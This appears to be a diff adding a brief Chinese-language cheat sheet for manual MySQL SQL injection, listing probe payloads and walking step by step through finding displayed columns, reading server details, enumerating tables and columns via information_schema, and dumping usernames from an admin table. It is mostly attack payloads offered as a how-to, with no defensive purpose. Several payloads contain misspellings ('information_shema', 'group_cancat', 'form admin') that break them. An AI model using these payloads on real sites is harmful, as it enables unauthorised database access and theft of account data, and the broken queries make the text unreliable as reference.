@@ -1,0 +1,60 @@
+SQL INJECT
+
+
+
++and+1=1
+
+
++and+1=2
+
+
++order+by+1,2,3,4,5......n
+
+
++and+1=2+union+select+1,2,3,4,5......n
+
+
+
+mysql手工注入：
+首先判断目标是否是注入点，这个我就不讲了。大家都知道。
+
+那么判断是注入点后怎么做呢，order by查询当前页面字节数
+这里假设字数是3。然后爆出显位。
+
+and 1=2 union select 1,2,3
+爆出显位过后呢（这里假设显位是2），就可以爆出数据库基本信息了。
+
+
+mysql中特有的函数：
+
+	user()      查询当前数据库用户
+
+	@@datadir        读出数据库路径
+
+	version()      查询数据库版本
+
+	@@basedir      MYsql的安装路径
+
+	database()     查询当前页面所连接的数据库名称
+
+	@@version_compile_os     查询服务器的系统版本
+
+
+前面说假设显位是2，那么我们把要查询的函数放在显位处
+and 1=2 union select 1,database(),3     
+
+这里得出database(),待会会用到。
+这里说一下，
+在mysql里有一个特殊的数据库 information_shema这里存放了所有的表名和列名。
+
+那么接下来就是爆表了
+and 1=2 union select 1,group_cancat(table_name),3 from information_shema.tables where table_shema=(database()函数所得值的hex值)
+
+这里假设有个admin表，
+接着又爆列
+and 1=2 union select 1,group_cancat(column_name),3 from information_shema.columns where table_name=(admin的hex值)
+
+这里假设有个username的列，爆数据
+union select 1,username,3 form admin
+好了，差不多就是这样了。
+
